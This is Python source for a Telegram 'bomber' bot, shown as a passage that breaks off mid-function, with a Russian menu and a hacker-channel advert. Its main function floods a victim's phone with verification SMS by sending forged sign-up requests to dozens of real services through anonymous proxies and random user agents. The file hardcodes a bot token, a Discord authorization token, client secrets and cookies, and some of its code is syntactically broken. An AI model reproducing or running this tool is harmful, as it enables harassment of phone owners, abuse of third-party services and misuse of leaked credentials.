# -*- coding: utf-8 -*-

#import telebot
from aiogram import Bot, types
from aiogram.dispatcher import Dispatcher
from aiogram.utils import executor
from user_agent import generate_user_agent
from models import db_session
from models.users import User
from datetime import datetime, timedelta
from fake_useragent import UserAgent

import re
import time
import string
import time
import threading
import requests
import random

bot_token = '1589016294:AAG7d0QjWyaKIlv_5fT3UCH13mmunBgiY3M'
db_session.global_init('database.db')

#bot = telebot.TeleBot(bot_token)
bot = Bot(token=bot_token)
dp = Dispatcher(bot)

# считаем для статистики
users = 4
running_spams_per_chat_id = []
users_amount = [0]
threads = list()
THREADS_AMOUNT = [0]
THREADS_LIMIT = 300
banned = []
admins = ['906123359', '1218845111']
phones = []

def check(thisid):
	global banned
	t = True
	for ban in banned:
		if str(ban) == str(thisid):
			t = False
	return t

@dp.message_handler(commands=['start'])
async def send_welcome(message: types.Message):
	global users, admins
	print(check(message.chat.id))
	if check(message.chat.id) == True:
		keyboard = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
		boom = types.KeyboardButton(text='💣БОМБЕР')
		stop = types.KeyboardButton(text='Стоп')
		info = types.KeyboardButton(text='ℹ️Инфа')
		stats = types.KeyboardButton(text='📈Статистика')
		donat = types.KeyboardButton(text='💰Донат боту на дедик')
		piar = types.KeyboardButton(text='💸 Реклама')
		faq = types.KeyboardButton(text='FAQ')

		buttons_to_add = [boom, stop, info, stats, donat, piar, faq]
		for admin in admins:
			if str(admin) == str(message.chat.id):
				buttons_to_add.append(types.KeyboardButton(text='Рассылка'))
		keyboard.add(*buttons_to_add)
		await bot.send_message(message.chat.id, 'Прив бандиты😈♂!\nНаш канал в ТГ: @prohacker101\nВыберите действие:',
						 reply_markup=keyboard)
		#
		iduser = message.from_user.id
		session = db_session.create_session()
		#
		user_all = session.query(User).all()
		T = True
		for all in user_all:
			if all.id == iduser:
				T = False

		if T == True:
			session = db_session.create_session()
			name = message.from_user.first_name
			url = message.from_user.username
			iduser = message.from_user.id
			user = User(
				id=iduser,
				name=name,
				username='@'+url
			)
			users += 1
			session.add(user)
			session.commit()
	else:
		await bot.send_message(message.chat.id, 'Вы были забанены, все вопросы к @Valerij212121')


def send_for_number(phone):
	request_timeout = 0.0000000000001

	_russian = "".join(
		[
			random.choice(
				"йцукенгшщзхъфывапролджэячмитьбюЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ"
			)
			for x in range(8)
		]
	)
	_name = "".join(
		[
			random.choice(
				"1234567890abcdefghigklmnopqrstuvyxwzABCDEFGHIGKLMNOPQRSTUVYXWZ"
			)
			for x in range(8)
		]
	)
	password = "".join(
		[
			random.choice(
				"1234567890abcdefghigklmnopqrstuvyxwzABCDEFGHIGKLMNOPQRSTUVYXWZ"
			)
			for x in range(11)
		]
	)
	username = "".join(
		[random.choice("1234567890abcdefghigklmnopqrstuvyxwz") for x in range(8)]
	)
	_email = (
		"".join(
			[random.choice("1234567890abcdefghigklmnopqrstuvyxwz") for x in range(8)]
		)
		+ "@gmail.com"
	)

	for x in range(12):
		_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
		password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
		username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	iteration = 0
	_email = _name + f'{iteration}' + '@gmail.com'
	email = _name + f'{iteration}' + '@gmail.com'
	_phone = phone
	_phoneNEW = phone[3:]
	_phone9 = _phone[1:]
	_phoneAresBank = '+' + _phone[0] + '(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[
													   9:11]  # +7+(915)350-99-08
	_phone9dostavista = _phone9[:3] + '+' + _phone9[3:6] + '-' + _phone9[6:8] + '-' + _phone9[8:10]  # 915+350-99-08
	_phoneOstin = '+' + _phone[0] + '+(' + _phone[1:4] + ')' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[
													   9:11]  # '+7+(915)350-99-08'
	_phonePizzahut = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + ' ' + _phone[7:9] + ' ' + _phone[
														 9:11]  # '+7 (915) 350 99 08'
	_phoneGorzdrav = _phone[1:4] + ') ' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[9:11]  # '915) 350-99-08'
	_phonePozichka = '+' + _phone[0:2] + '-' + _phone[2:5] + '-' + _phone[5:8] + '-' + _phone[8:10] + '-' + _phone[
														10:12]  # 38-050-669-16-10'
	_phoneQ = '+' + _phone[0:2] + '(' + _phone[2:5] + ') ' + _phone[5:8] + ' ' + _phone[8:10] + ' ' + _phone[
													  10:12]  # +38(050) 669 16 10
	_phoneCitrus = '+' + _phone[0:3] + ' ' + _phone[3:5] + '-' + _phone[5:8] + ' ' + _phone[8:10] + ' ' + _phone[10:12]
	_phoneComfy = '+' + _phone[0:2] + ' (' + _phone[2:5] + ') ' + _phone[5:8] + '-' + _phone[8:10] + '-' + _phone[10:12]
	_phone88 = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + ' ' + _phone[7:9] + '-' + _phone[9:11]
	_phone585 = '+' + _phone[0] + ' (' + _phone[1:4] + ') ' + _phone[4:7] + '-' + _phone[7:9] + '-' + _phone[
													  9:11]  # +7 (925) 350-99-01
	request_timeout = 0.01
	phone = _phone
	iteration = 0
	ua = UserAgent()
	proxy_for_spam = requests.get('https://www.proxy-list.download/api/v1/get?type=http&anon=elite').text.split('\r\n')
	def phone_format(phone, maska):
		if len(phone) == maska.count('X'):
			str_list = list(phone)
			for i in str_list:
				maska = maska.replace("X", i, 1)
			return mask
	_name = ''
	for x in range(12):
		_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
		password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
		username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	_nameR = ['Александр', 'Алексей', 'Анатолий', 'Андрей', 'Антон', 'Аркадий', 'Арсений', 'Артём', 'Артур', 'Борис', 'Вадим', 'Валентин', 'Валерий', 'Василий', 'Виктор', 'Виталий', 'Владимир', 'Владислав', 'Вячеслав', 'Георгий', 'Глеб', 'Григорий', 'Даниил', 'Денис', 'Дмитрий', 'Евгений', 'Егор', 'Иван', 'Игорь', 'Илья', 'Кирилл', 'Константин', 'Лев', 'Леонид', 'Максим', 'Марк', 'Матвей', 'Михаил', 'Никита', 'Николай', 'Олег', 'Павел', 'Пётр', 'Роман', 'Руслан', 'Сергей', 'Степан', 'Тимур', 'Фёдор', 'Юрий', 'Ярослав']
	_email = _name + f'{iteration}' + '@gmail.com'
	email = _name + f'{iteration}' + '@gmail.com'
	try:
	  requests.post('https://secure.ubki.ua/b2_api_xml/ubki/auth', json={"doc": {
		"auth": {"mphone": "+" + _phone, "bdate": "11.11.1999", "deviceid": "00100", "version": "1.0",
			 "source": "site", "signature": "undefined"}}}, headers={"Accept": "application/json","User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')

	try:
	  requests.post('https://www.top-shop.ru/login/loginByPhone/', data={"phone": _phonePizzahut},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')

	try:
	  requests.post("https://izi.ua/api/auth/register",
			  json={
				"phone": "+" + _phone,
				"name": "Анастасия",
				"is_terms_accepted": True,
			  },headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')

	try:
	  requests.post("https://izi.ua/api/auth/sms-login", json={"phone": "+" + _phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	 print('-')

	try:
	  requests.post('https://api.pozichka.ua/v1/registration/send',
			  json={"RegisterSendForm": {"phone": _phonePozichka}},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')

	try:
	  requests.post('https://ontaxi.com.ua/api/v2/web/client', data={"country": "UA", "phone": phone[3:]},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')

	try:
	  requests.post('https://makarolls.ru/bitrix/components/aloe/aloe.user/login_new.php',
			  data={"data": _phone, "metod": "postreg"},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')

	try:
	  requests.post('https://www.panpizza.ru/index.php?route=account/customer/sendSMSCode',
			  data={"telephone": "8" + _phone[1:]},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')

	try:
	  requests.post("https://www.moyo.ua/identity/registration",
			  data={"firstname": "Артем", "phone": _phone, "email": email},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')

	try:
	  requests.post('https://starpizzacafe.com/mods/a.function.php', data={'aj': '50', 'registration-phone': _phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')

	try:
	  requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',
			  data={'phone_number': _phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')

	try:
	  requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': _phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')
	try:
	  requests.post("https://loany.com.ua/funct/ajax/registration/code",
			  data={"phone": _phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')

	try:
	  requests.post("https://www.sportmaster.ru/user/session/sendSmsCode.do",
			  params={"phone": _phone585},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')

	try:
	  requests.post("https://iqlab.com.ua/session/ajaxregister",
			  data={"cellphone": _phoneQ},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	 print('-')

	try:
	  requests.post("https://izi.ua/api/auth/register",
			  json={
				"phone": "+" + _phone,
				"name": "Артём",
				"is_terms_accepted": True,
			  },headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')

	try:
	  requests.post("https://secure.ubki.ua/b2_api_xml/ubki/auth",
			  json={
				"doc": {
				  "auth": {
					"mphone": "+" + _phone,
					"bdate": "11.11.1999",
					"deviceid": "00100",
					"version": "1.0",
					"source": "site",
					"signature": "undefined",
				  }
				}
			  },
			  headers={"Accept": "application/json"},
			  )
	  print('+')
	except:
	  print('-')

	try:
	  requests.post("https://api.pozichka.ua/v1/registration/send",
			  json={
				"RegisterSendForm": {
				  "phone": _phonePozichka
				}
			  },headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')

	try:
	  requests.post("https://www.aptekaonline.ru/login/ajax_sms_order.php",
			  data={"PERSONAL_MOBILE": "+" + _phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')

	try:
	  requests.post("https://api.cian.ru/sms/v1/send-validation-code/",
			  json={"phone": "+" + _phone, "type": "authenticateCode"},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')

	try:
	  requests.post("https://clients.cleversite.ru/callback/run.php",
			  data={
				"siteid": "62731",
				"num": _phone,
				"title": "Онлайн-консультант",
				"referrer": "https://m.cleversite.ru/call",
			  },headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')
	ua = UserAgent()
	proxy_for_spam = requests.get(
		'https://www.proxy-list.download/api/v1/get?type=http&anon=elite').text.split('\r\n')
	proxy = proxy_for_spam
	_name = ''
	password = ''
	username = ''
	for x in range(12):
		_name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
		password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
		username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
	_nameR = ['Александр', 'Алексей', 'Анатолий', 'Андрей', 'Антон', 'Аркадий', 'Арсений', 'Артём', 'Артур', 'Борис', 'Вадим', 'Валентин', 'Валерий', 'Василий', 'Виктор', 'Виталий', 'Владимир', 'Владислав', 'Вячеслав', 'Георгий', 'Глеб', 'Григорий', 'Даниил', 'Денис', 'Дмитрий', 'Евгений', 'Егор', 'Иван', 'Игорь', 'Илья', 'Кирилл', 'Константин', 'Лев', 'Леонид', 'Максим', 'Марк', 'Матвей', 'Михаил', 'Никита', 'Николай', 'Олег', 'Павел', 'Пётр', 'Роман', 'Руслан', 'Сергей', 'Степан', 'Тимур', 'Фёдор', 'Юрий', 'Ярослав']
	_email = _name + '@gmail.com'
	email = _name + '@gmail.com'
	try:
		requests.post('https://cash-u.com/main/rest/firstrequest/phone/confirmation/send', data = {phone_format(phone, 'X (XXX) XXX-XX-XX'): ''},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
		print('+')
	except:
	    print('-')
	try:
		requests.post('https://www.tanuki.ru/sendCode/', json = {"phone":phone_format(phone, "(+X)XXXXXXXXXX"),"smsType":2,"headers":{"version":"2.0","userId":"666ebf12-9cd5-ed2f-a7c9-67f3a8d99ab1","debugMode":True,"agent":{"device":"mobile","version":"undefined undefined"},"dbgValue":"","langId":"1","cityId":"1"}},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
		print('+')
	except:
	    print('-')
	try:
		requests.post('https://goldapple.ru/rest/V1/customer/registration/start', json = {"country_code":"RU","phone":phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
		print('+')
	print('+')
	except:
	    print('-')
	try:
		requests.get('https://app.taxsee.com/send-link/?intl=ru-RU&phone=%2B' + phone_format(phone, 'XXX(XX)XXX-XX-XX'),headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
		print('+')
	except:
	    print('-')
	try:
		requests.post('https://app.burgerking.ru/bridge/auth/index', json = {'phone': "+" + phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
		print('+')
	except:
	    print('-')
	try:
		requests.post('https://lenta.com/api/v1/authentication/requestValidationCode',json={'phone': '+' + phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://www.gloria-jeans.ru/phone-verification/send-code/registration", json={"phoneNumber": "+" + phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
		print('+')
	except:
	    print('-')
	try:
		requests.post("https://kinoteatr.ru/cgi-bin/api.pl",json={"method": "SendSMSToConfirmPhone","params": {"Phone": phone[1:]}},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	    print('+')
	except:
	    print('-')
	try:
		requests.post('https://prosto.tv/wp-admin/admin-ajax.php', data={'action': 'check-phone', 'phone': '+'+phone, "username": random.choice(_nameR), '_nonce': '1a79e1841d'}, headers = {'user-agent': ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')
	try:
		requests.get(f'https://api.eldorado.ua/v2.0/sign?lang=ru&action=phone_check&login={phone}', headers = {'user-agent': ua.random})
	  print('+')
	except:
	  print('-')
	try:
		requests.post('https://mobile-api.qiwi.com/oauth/authorize', data = {'response_type': 'urn:qiwi:oauth:response-type:confirmation-id', 'username': phone, 'client_id': 'android-qw', 'client_secret': 'zAm4FKq9UnSe7id'},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')
	try:
		requests.post('https://oll.tv/api/signup?lang=ru', data = {'phone': phone, 'email': _email},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')
	try:
		requests.post('https://my.citrus.ua/api/auth/login', json={"identity":phone_format(phone, '+XXX XX XXX XX XX')},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')
	try:
		requests.post('https://api.omegatv.com.ua/auth/in', data={'phone': phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')
	try:
		requests.post('https://discord.com/api/v8/users/@me/phone', json={"phone":"+"+phone}, headers = {'authorization': 'Nzk5OTExMDgyMDg4MjAyMjQx.YAKdcA.Yyx-Vxd0dRjd2e8FBGYYRQZhMSE','User-Agent': ua.random})
	  print('+')
	except:
	  print('-')
	try:
		requests.get(f'https://my.hmara.tv/api/sign?contact={phone}&deviceId=19771abf-60c5-42b1-b0d5-137074fd055d&language=uk&profileId=1&deviceType=2&ver=2.2.9',headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')
	try:
		requests.post('https://api.sweet.tv/SignupService/SetPhone.json', json = {"phone":phone,"device":{"type":"DT_Web_Browser","application":{"type":"AT_SWEET_TV_Player"},"model":ua.random,"firmware":{"versionCode":1,"versionString":"2.4.2"},"uuid":"8376b751-a2b1-46f0-b5e3-e6eab6cbbaee","supported_drm":{"widevine_modular":True}},"locale":"uk"},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')
	try:
		requests.post('https://api.sweet.tv/SignupService/SetPhone.json', json = {"phone":phone,"device":{"type":"DT_Web_Browser","application":{"type":"AT_TRINITY_Player"},"uuid":"9f95282b-05cd-4ce0-b968-fb0e35a930f5","supported_drm":{"widevine_modular":True}},"locale":"uk"},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')
	try:
		requests.post('http://fileportalua.net/?page=join', data = {'number':phone_format(phone, '+XX (XXX) XXX XX-XX'), 'ok': 'yes', 'token': ''},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')
	try:
		requests.post('https://prosto.tv/wp-admin/admin-ajax.php', data={'action': 'resend-sms', 'phone': '+'+phone, '_nonce': '1a79e1841d'})
	  print('+')
	except:
	  print('-')
	try:
		requests.post("https://uklon.com.ua/api/v1/account/code/send",headers={ "client_id":	"6289de851fc726f887af8d5d7a56c635", "User-Agent":   ua.random,},json={"phone": phone})
		requests.post("https://partner.uklon.com.ua/api/v1/registration/sendcode",headers={ "client_id":	"6289de851fc726f887af8d5d7a56c635", "User-Agent":   ua.random,},json={"phone": phone})
	  print('+')
	except:
	  print('-')
	try:
		requests.post("https://allo.ua/ua/customer/account/createPostVue/?currentTheme=main&currentLocale=uk_UA",data={ "firstname": random.choice(_nameR), "telephone": phone, "email": _email,	"password": password,   "form_key": "Zqqj7CyjkKG2ImM8",},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')
	try:
		requests.post("https://youla.ru/web-api/auth/request_code",data={"phone": phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')
	try:
		requests.post("https://cloud.mail.ru/api/v2/notify/applink",json={  "phone": "+" + phone,   "api": 2,   "email": _email,	"x-email": "x-email",},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')
	try:
		requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php",data={	"msisdn": phone,	"locale": "en", "countryCode": "ru",	"version": "1", "k": "ic1rtwz1s1Hj1O0r",	"r": "46763",},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')
	try:
		requests.post("https://auth.multiplex.ua/login",json={"login": phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')
	try:
		requests.post("https://youla.ru/web-api/auth/request_code",data={"phone": phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')
	try:
		requests.post("https://passport.twitch.tv/register?trusted_request=true",json={ "birthday": {	   "day": 11,	  "month": 11,		"year": 1999	},  "client_id": "kd1unb4b3q4t58fwlpcbzcbnm76a8fp", "include_verification_code": True,  "password": password,   "phone_number": phone,  "username": username,},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')
	try:
		requests.post(f"https://www.citilink.ru/registration/confirm/phone/+{phone}/",headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')
	try:
		requests.post("https://eda.yandex/api/v1/user/request_authentication_code",json={"phone_number": "+" + phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')
	try:
		requests.post("http://94.154.218.82:7201/api/account/register/sendConfirmCode",json={"phone": phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')
	try:
		requests.get("https://findclone.ru/register",params={"phone": "+" + phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')
	try:
		requests.post("http://212.22.223.149:7200/api/account/register/sendConfirmCode",json={"phone": phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')
	try:
		requests.post("https://back.zecredit.com.ua/v1/api/rest/verifications", json={'phone': phone, 'action': 'REGISTRATION'},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')
	try:
		requests.post("https://prod.tvh.mts.ru/tvh-public-api-gateway/public/rest/general/send-code", params={"msisdn": phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')
	try:
		requests.post("https://api.tinkoff.ru/v1/sign_up", data={"phone": phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')
	try:
		requests.post("https://koronapay.com/transfers/online/api/users/otps",data={"phone": phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')
	try:
		requests.post('https://www.dns-shop.ru/auth/auth/fast-authorization/',headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)}, data={'FastAuthorizationLoginLoadForm[login]': phone, 'FastAuthorizationLoginLoadForm[token]': ''})
	  print('+')
	except:
	  print('-')
	try:
		requests.post('https://3040.com.ua/taxi-ordering', data={"callback-phone": _phone},headers={"User-Agent": ua.random},proxies={'http': random.choice(proxy_for_spam)})
	  print('+')
	except:
	  print('-')
	head = {
		"User-Agent": generate_user_agent(device_type="desktop", os=("mac", "linux")),
		"X-Requested-With": "XMLHttpRequest",
	}
	try:
		requests.post(
			"https://uklon.com.ua/api/v1/account/code/send",
			headers={
				"client_id": "6289de851fc726f887af8d5d7a56c635",
				"User-Agent": generate_user_agent(
					device_type="desktop", os=("mac", "linux")
				),
				"X-Requested-With": "XMLHttpRequest",
			},
			json={"phone": phone},
			timeout=2,
		)
		requests.post(
			"https://partner.uklon.com.ua/api/v1/registration/sendcode",
			headers={
				"client_id": "6289de851fc726f887af8d5d7a56c635",
				"User-Agent": generate_user_agent(
					device_type="desktop", os=("mac", "linux")
				),
				"X-Requested-With": "XMLHttpRequest",
			},
			json={"phone": phone},
			timeout=2,
		)
  		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://www.moyo.ua/identity/registration",
			data={"firstname": "Олег", "phone": phone, "email": _email, },
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')

	try:
		requests.post(
			"https://koronapay.com/transfers/online/api/users/otps",
			data={"phone": phone, },
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		frisor = {
			"Content-type": "application/json",
			"Accept": "application/json, text/plain",
			"authorization": "Bearer yusw3yeu6hrr4r9j3gw6",
			"User-Agent": generate_user_agent(
				device_type="desktop", os=("mac", "linux")
			),
			"cookie": "auth=vov0ptt2rlhni0ten4n9kh5q078l0dm5elp904lq6ncsfmac0md8i8bcmqilk8u3; lang=1; yc_vid=97527048909; yc_firstvisit=1589271208; _ym_uid=1589271210161580972; _ym_d=1589271210; _ga=GA1.2.2045789867.1589271211; _gid=GA1.2.807235883.1589271211; _ym_visorc_35239280=b; _ym_isad=2; _gat_gtag_UA_68406331_1=1",
		}
		requests.post(
			"https://n13423.yclients.com/api/v1/book_code/312054",
			data=json.dumps({"phone": phone}),
			headers=frisor,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://kasta.ua/api/v2/login/", data={"phone": phone}, timeout=2
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://izi.ua/api/auth/register",
			json={
				"phone": "+" + phone,
				"name": _russian,
				"is_terms_accepted": "true",
			},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://junker.kiev.ua/postmaster.php",
			data={"tel": phone[2:], "name": _name, "action": "callme", },
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://allo.ua/ua/customer/account/createPostVue/?currentTheme=main&currentLocale=uk_UA",
			data={
				"firstname": _russian,
				"telephone": phone,
				"email": _email,
				"password": password,
				"form_key": "Zqqj7CyjkKG2ImM8",
			},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://stores-api.zakaz.ua/user/signup/",
			json={"phone": phone},
			headers={
				"Accept": "*/*",
				"Content-Type": "application/json",
				"Referer": "https://megamarket.zakaz.ua/ru/products/megamarket00000000122023/sausages-farro/",
				"User-Agent": generate_user_agent(
					device_type="desktop", os=("mac", "linux")
				),
				"x-chain": "megamarket",
			},
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://youla.ru/web-api/auth/request_code",
			data={"phone": phone},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://cloud.mail.ru/api/v2/notify/applink",
			json={
				"phone": "+" + phone,
				"api": 2,
				"email": _email,
				"x-email": "x-email",
			},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru",
			data={"phone": phone},
			headers=head,
			timeout=2,
		)
		requests.post(
			f"https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+{phone}",
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru",
			data={"phone_number": phone},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://crm.getmancar.com.ua/api/veryfyaccount",
			json={
				"phone": "+" + phone,
				"grant_type": "password",
				"client_id": "gcarAppMob",
				"client_secret": "SomeRandomCharsAndNumbersMobile",
			},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://www.icq.com/smsreg/requestPhoneValidation.php",
			data={
				"msisdn": phone,
				"locale": "en",
				"countryCode": "ru",
				"version": "1",
				"k": "ic1rtwz1s1Hj1O0r",
				"r": "46763",
			},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://api.pozichka.ua/v1/registration/send",
			json={"RegisterSendForm": {"phone": "+" + phone}},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			f"https://secure.online.ua/ajax/check_phone/?reg_phone={phone}",
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+{}".format(
				phone
			),
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper",
			params={"oper": 9, "callmode": 1, "phone": "+" + phone},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://city24.ua/personalaccount/account/registration",
			data={"PhoneNumber": phone},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://helsi.me/api/healthy/accounts/login",
			json={"phone": phone, "platform": "PISWeb"},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://cloud.mail.ru/api/v2/notify/applink",
			json={"phone": "+" + phone, "api": 2, "email": _email},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://auth.multiplex.ua/login",
			json={"login": phone},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.post(
			"https://account.my.games/signup_send_sms/",
			data={"phone": phone},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
	    print('-')
	try:
		requests.get(
			"https://cabinet.planetakino.ua/service/sms",
			params={"phone": phone},
			headers=head,
			timeout=2,
		)
		print('+')
	except:
